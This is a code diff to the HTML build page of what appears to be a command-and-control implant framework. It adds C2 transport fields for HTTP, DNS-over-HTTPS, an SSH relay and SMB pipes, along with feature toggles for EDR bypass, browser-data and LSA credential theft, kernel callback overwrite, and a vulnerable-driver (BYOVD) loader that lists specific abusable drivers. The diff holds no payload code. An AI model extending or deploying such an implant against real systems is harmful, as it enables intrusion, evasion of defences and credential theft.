@@ -362,6 +362,78 @@
         </label>
         <button id="btn-fetch-pin" style="align-self:flex-end;" title="Fetch fingerprint from this server">Fetch from Server</button>
       </div>
+      <div id="transport-config" hidden>
+        <div id="transport-http" hidden>
+          <div class="row">
+            <label style="flex:2">HTTP Endpoint
+              <input type="text" id="build-http-endpoint" placeholder="http://c2.example.com:8446" style="width:100%;margin-top:0.25rem;">
+            </label>
+            <label style="flex:1">HTTP Host Header
+              <input type="text" id="build-http-host-header" placeholder="c2.example.com" style="width:100%;margin-top:0.25rem;">
+            </label>
+          </div>
+        </div>
+        <div id="transport-doh" hidden>
+          <div class="row">
+            <label style="flex:2">DoH Server URL
+              <input type="text" id="build-doh-server-url" placeholder="https://c2.example.com:8445/dns-query" style="width:100%;margin-top:0.25rem;">
+            </label>
+            <label style="flex:1">DoH Domain
+              <input type="text" id="build-doh-domain" placeholder="c2.example.com" style="width:100%;margin-top:0.25rem;">
+            </label>
+          </div>
+        </div>
+        <div id="transport-ssh" hidden>
+          <div class="row">
+            <label style="flex:2">SSH Host
+              <input type="text" id="build-ssh-host" placeholder="relay.example.com" style="width:100%;margin-top:0.25rem;">
+            </label>
+            <label style="flex:1">SSH Port
+              <input type="number" id="build-ssh-port" placeholder="22" style="width:100%;margin-top:0.25rem;">
+            </label>
+            <label style="flex:1">SSH Username
+              <input type="text" id="build-ssh-username" placeholder="operator" style="width:100%;margin-top:0.25rem;">
+            </label>
+          </div>
+          <div class="row">
+            <label style="flex:1">SSH Auth
+              <select id="build-ssh-auth-type" style="width:100%;margin-top:0.25rem;">
+                <option value="agent" selected>ssh-agent</option>
+                <option value="password">Password</option>
+                <option value="key">Key Path</option>
+              </select>
+            </label>
+            <label style="flex:2">SSH Password
+              <input type="password" id="build-ssh-password" style="width:100%;margin-top:0.25rem;">
+            </label>
+            <label style="flex:2">SSH Key Path
+              <input type="text" id="build-ssh-key-path" placeholder="/home/user/.ssh/id_ed25519" style="width:100%;margin-top:0.25rem;">
+            </label>
+            <label style="flex:2">SSH Host Key Fingerprint
+              <input type="text" id="build-ssh-host-key-fp" placeholder="SHA256:..." style="width:100%;margin-top:0.25rem;">
+            </label>
+          </div>
+        </div>
+        <div id="transport-smb" hidden>
+          <div class="row">
+            <label style="flex:2">SMB Pipe Host
+              <input type="text" id="build-smb-pipe-host" placeholder="10.0.0.5" style="width:100%;margin-top:0.25rem;">
+            </label>
+            <label style="flex:1">Pipe Name
+              <input type="text" id="build-smb-pipe-name" placeholder="orchestra" style="width:100%;margin-top:0.25rem;">
+            </label>
+            <label style="flex:1">Pipe Mode
+              <select id="build-smb-pipe-mode" style="width:100%;margin-top:0.25rem;">
+                <option value="smb" selected>SMB</option>
+                <option value="tcp_relay">TCP Relay</option>
+              </select>
+            </label>
+            <label style="flex:1">Relay Port
+              <input type="number" id="build-smb-tcp-relay-port" placeholder="4455" style="width:100%;margin-top:0.25rem;">
+            </label>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- ── Encryption / Signing ────────────────────────────────── -->
@@ -414,6 +486,31 @@
         <label><input type="checkbox" id="feat-evasion-transform"> EDR Bypass Transform Engine</label>
         <label><input type="checkbox" id="feat-p2p"> P2P Mesh Networking</label>
         <label><input type="checkbox" id="feat-stack-spoof"> Stack Spoofing</label>
+        <label><input type="checkbox" id="feat-manual-map"> Manual Map Loader</label>
+        <label><input type="checkbox" id="feat-browser-data"> Browser Data</label>
+        <label><input type="checkbox" id="feat-lsa-whisperer"> LSA Whisperer</label>
+        <label><input type="checkbox" id="feat-kernel-callback"> Kernel Callback Overwrite</label>
+        <label><input type="checkbox" id="feat-embedded-driver"> Embedded Driver Payload</label>
+      </div>
+      <!-- Driver path: only relevant when embedded_driver is checked -->
+      <div id="embedded-driver-config" hidden style="margin-top:0.5rem;padding:0.75rem;background:var(--bg2,#1e1e2e);border-radius:4px;border:1px solid var(--border,#444)">
+        <label style="display:block;margin-bottom:0.4rem;font-weight:600">BYOVD Driver Path
+          <span style="font-size:0.8em;font-weight:normal;color:var(--muted,#888)"> — server-side path to XOR-encrypted driver binary</span>
+        </label>
+        <input type="text" id="byovd-driver-path" placeholder="/opt/orchestra/drivers/dbutil_2_3_xor.bin" style="width:100%;box-sizing:border-box">
+        <p style="margin:0.4rem 0 0;font-size:0.8em;color:var(--muted,#888)">
+          The file must be XOR-encrypted with the agent HKDF session key before the build.
+          Supported drivers: <code>DBUtil_2_3.sys</code>, <code>rtcore64.sys</code>, <code>gdrv.sys</code>,
+          <code>cpuz141.sys</code>, <code>MsIo64.sys</code>, <code>iQVW64.SYS</code>, and others in the driver DB.
+        </p>
+      </div>
+      <div class="feat-grid">
+        <label><input type="checkbox" id="feat-evanesco"> Evanesco Continuous Memory Hiding</label>
+        <label><input type="checkbox" id="feat-syscall-emulation"> Syscall Emulation</label>
+        <label><input type="checkbox" id="feat-cet-bypass"> CET / Shadow-Stack Bypass</label>
+        <label><input type="checkbox" id="feat-token-impersonation"> Token Impersonation</label>
+        <label><input type="checkbox" id="feat-transacted-hollowing"> Transacted Hollowing</label>
+        <label><input type="checkbox" id="feat-delayed-stomp"> Delayed Module Stomp</label>
       </div>
     </div>
 
